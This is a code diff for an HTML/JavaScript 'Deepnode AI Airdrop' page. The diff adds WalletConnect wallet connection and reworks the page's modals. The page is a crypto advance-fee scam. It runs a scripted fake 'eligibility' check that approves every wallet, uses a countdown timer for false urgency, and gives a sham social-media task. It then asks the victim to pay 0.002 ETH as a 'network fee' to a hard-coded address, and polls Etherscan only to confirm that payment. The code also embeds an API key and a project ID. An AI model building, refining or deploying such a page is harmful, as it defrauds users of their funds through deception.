@@ -1,11 +1,16 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Deepnode AI Airdrop</title>
 
+<!-- Ethers.js -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+<!-- WalletConnect v2 -->
+<script src="https://unpkg.com/@walletconnect/client@2.9.12/dist/umd/index.min.js"></script>
+<script src="https://unpkg.com/@walletconnect/qrcode-modal@1.6.1/dist/umd/index.min.js"></script>
 
 <style>
 html,body{margin:0;padding:0;height:100%;font-family:-apple-system,BlinkMacSystemFont,Inter,Arial;color:#fff;background:linear-gradient(180deg,#05060f,#1a0b2e,#3b145f);}
@@ -18,7 +23,7 @@ button:disabled{opacity:.5;cursor:not-allowed}
 .footer{position:absolute;bottom:22px;font-size:12px;opacity:.6}
 
 /* Modal styles */
-.modal{position:fixed;inset:0;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center;z-index:100;}
 .box{background:#0e0f1f;padding:24px;border-radius:16px;width:90%;max-width:360px;text-align:center}
 .loader-section{margin-bottom:20px}
 .progress{height:8px;background:rgba(255,255,255,.15);border-radius:10px;overflow:hidden;margin-top:10px}
@@ -31,37 +36,38 @@ button:disabled{opacity:.5;cursor:not-allowed}
 .taskBtn{background:linear-gradient(90deg,#1DA1F2,#0d8ddb);margin-top:8px;}
 </style>
 </head>
-
 <body>
 
 <div class="container">
   <img src="deepnode-logo.png" class="logo">
   <h1>Connect wallet to claim Deepnode AI airdrop</h1>
 
-  <button onclick="connectMetaMask()">Connect MetaMask</button>
+  <button onclick="connectWallet()">Connect Wallet</button>
 
   <div class="status" id="status"></div>
   <div class="footer">Deepnode AI • Terms & Privacy</div>
 </div>
 
-<div class="modal" id="modal">
+<!-- Eligibility Modal -->
+<div class="modal" id="eligibilityModal">
   <div class="box">
-    <!-- Eligibility loader -->
-    <div class="loader-section">
-      <div id="modalText">Checking eligibility…</div>
-      <div class="progress"><div class="bar" id="bar"></div></div>
-    </div>
+    <div id="modalText">Checking eligibility…</div>
+    <div class="progress"><div class="bar" id="bar"></div></div>
     <div class="addr" id="addr"></div>
+  </div>
+</div>
 
+<!-- Task + Payment Modal -->
+<div class="modal" id="taskModal">
+  <div class="box">
     <!-- Task section -->
-    <div id="taskSection" style="margin-top:20px; text-align:center; display:none;">
+    <div id="taskSection" style="margin-top:20px; text-align:center;">
       <p>🎯 Task: Follow us on X to unlock the airdrop!</p>
       <a href="https://x.com/deepnodeai?s=21" target="_blank">
         <button class="taskBtn">Follow @deepnodeai</button>
       </a>
       <button id="taskCompleteBtn" class="taskCompleteBtn" disabled>Task Completed</button>
     </div>
-
     <!-- Payment and claim buttons -->
     <button class="payBtn" id="payBtn" onclick="payFee()" disabled>Pay 0.002 ETH Network Fee</button>
     <button class="checkBtn" id="checkBtn" onclick="checkPayment()" disabled>Check Payment</button>
@@ -74,9 +80,8 @@ button:disabled{opacity:.5;cursor:not-allowed}
 const RECIPIENT = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
 const REQUIRED_ETH = "0.002";
 const ETHERSCAN_KEY = "VDQVS25IXQDJ8HZ2J8B3KWC9R4HI48Y14T";
-
-/* ================= STATE ================= */
-let provider, signer, currentAddress;
+let currentAddress;
+let provider, signer;
 
 /* ================= TIMER ================= */
 const timerEl = document.getElementById("status");
@@ -87,103 +92,128 @@ if(!endTime){
 }
 function updateTimer(){
   const diff = endTime - Date.now();
-  if(diff <= 0){ timerEl.innerText="Claim period ended"; return; }
+  if(diff <=0){ timerEl.innerText="Claim period ended"; return; }
   const h = Math.floor(diff/3600000);
   const m = Math.floor((diff%3600000)/60000);
   const s = Math.floor((diff%60000)/1000);
-  timerEl.innerText = `Claim ends in ${h}h ${m}m ${s}s`;
+  timerEl.innerText=`Claim ends in ${h}h ${m}m ${s}s`;
 }
 setInterval(updateTimer,1000);
 updateTimer();
 
-/* ================= CONNECT ================= */
-async function connectMetaMask(){
-  if(!window.ethereum){
-    document.getElementById("status").innerText="Open in MetaMask mobile browser";
-    return;
+/* ================= CONNECT WALLET ================= */
+async function connectWallet(){
+  if(window.ethereum){
+    // MetaMask mobile/browser
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts",[]);
+    signer = provider.getSigner();
+    currentAddress = await signer.getAddress();
+    afterConnect();
+  } else {
+    // WalletConnect v2 (desktop)
+    const wc = new window.WalletConnect.default({
+      projectId: "e703ffab6d65fd8ada1adc0bfb719136",
+      relayUrl: "wss://relay.walletconnect.com",
+      metadata: {
+        name: "Deepnode AI Airdrop",
+        description: "Claim your exclusive Deepnode AI airdrop",
+        url: window.location.href,
+        icons: ["https://deepnodelive.github.io/deepnode-ai-airdrop/deepnode-logo.png"]
+      }
+    });
+    if(!wc.connected){
+      await wc.connect();
+    }
+    currentAddress = wc.accounts[0];
+    afterConnect();
   }
-  provider = new ethers.providers.Web3Provider(window.ethereum);
-  await provider.send("eth_requestAccounts",[]);
-  signer = provider.getSigner();
-  currentAddress = await signer.getAddress();
-  afterConnect();
 }
 
 /* ================= AFTER CONNECT ================= */
 function afterConnect(){
   if(localStorage.getItem("claimed_"+currentAddress)){
-    document.getElementById("status").innerText = "This wallet has already claimed.";
+    timerEl.innerText = "This wallet has already claimed.";
     return;
   }
-  document.getElementById("status").innerText = "Wallet connected";
+  timerEl.innerText = "Wallet connected: " + currentAddress.slice(0,6)+"..."+currentAddress.slice(-4);
   showEligibility();
 }
 
-/* ================= ELIGIBILITY ================= */
+/* ================= ELIGIBILITY LOADER ================= */
 function showEligibility(){
-  const modal = document.getElementById("modal");
+  const modal = document.getElementById("eligibilityModal");
   const bar = document.getElementById("bar");
   const text = document.getElementById("modalText");
-  const addr = document.getElementById("addr");
-  const taskSection = document.getElementById("taskSection");
-  const taskBtn = document.getElementById("taskCompleteBtn");
-  const payBtn = document.getElementById("payBtn");
-  const checkBtn = document.getElementById("checkBtn");
+  const addrEl = document.getElementById("addr");
 
   modal.style.display="flex";
   bar.style.width="0%";
   text.innerText="Checking eligibility…";
-  addr.innerText=currentAddress;
+  addrEl.innerText=currentAddress;
 
-  let progress = 0;
-  const i = setInterval(()=>{
+  let progress=0;
+  const phases=["Scanning wallet activity…","Validating eligibility…","Allocating airdrop…"];
+  let step=0;
+
+  const interval=setInterval(()=>{
     progress+=25;
-    bar.style.width = progress+"%";
+    bar.style.width=progress+"%";
+    text.innerText=phases[Math.min(step,phases.length-1)];
+    step++;
     if(progress>=100){
-      clearInterval(i);
-      text.innerText = "✅ Eligible to claim airdrop";
-      taskSection.style.display="block";
-      taskBtn.disabled=false; // allow user to mark task complete
+      clearInterval(interval);
+      text.innerText="✅ Eligible!";
+      modal.style.display="none";
+      showTaskModal();
     }
-  },400);
+  },500);
+}
 
-  // Enable pay button after task completed
-  taskBtn.addEventListener("click", ()=>{
-    payBtn.disabled = false;
-    payBtn.style.opacity = 1;
-    checkBtn.disabled = false;
-    taskBtn.disabled = true;
-    taskBtn.innerText = "✅ Task Verified";
+/* ================= TASK MODAL ================= */
+function showTaskModal(){
+  const modal = document.getElementById("taskModal");
+  modal.style.display="flex";
+
+  const taskBtn = document.getElementById("taskCompleteBtn");
+  const payBtn = document.getElementById("payBtn");
+  const checkBtn = document.getElementById("checkBtn");
+
+  taskBtn.disabled=false;
+
+  taskBtn.addEventListener("click",()=>{
+    payBtn.disabled=false;
+    payBtn.style.opacity=1;
+    checkBtn.disabled=false;
+    taskBtn.disabled=true;
+    taskBtn.innerText="✅ Task Verified";
   });
 }
 
-/* ================= PAY ================= */
-async function payFee(){
+/* ================= PAY FEE ================= */
+function payFee(){
   const wei = ethers.utils.parseEther(REQUIRED_ETH).toString();
-  window.location.href = `ethereum:${RECIPIENT}?value=${wei}`;
+  window.location.href=`ethereum:${RECIPIENT}?value=${wei}`;
 }
 
-/* ================= VERIFY PAYMENT ================= */
+/* ================= CHECK PAYMENT ================= */
 async function checkPayment(){
   const text = document.getElementById("modalText");
   text.innerText="Checking payment…";
   try{
     const res = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${currentAddress}&sort=desc&apikey=${ETHERSCAN_KEY}`);
     const data = await res.json();
-    const txList = Array.isArray(data.result) ? data.result : [];
-    const paid = txList.some(tx =>
-      tx.to?.toLowerCase() === RECIPIENT.toLowerCase() &&
-      ethers.utils.formatEther(tx.value) === REQUIRED_ETH
-    );
+    const txList = Array.isArray(data.result)?data.result:[];
+    const paid = txList.some(tx=>tx.to?.toLowerCase()===RECIPIENT.toLowerCase() && ethers.utils.formatEther(tx.value)===REQUIRED_ETH);
     if(paid){
       text.innerText="✅ Payment confirmed";
-      const c = document.getElementById("claimBtn");
-      c.disabled=false;
-      c.style.opacity=1;
+      const claimBtn = document.getElementById("claimBtn");
+      claimBtn.disabled=false;
+      claimBtn.style.opacity=1;
     } else {
       text.innerText="⚠️ Payment not found yet";
     }
-  } catch{
+  }catch{
     text.innerText="⚠️ Unable to check payment";
   }
 }
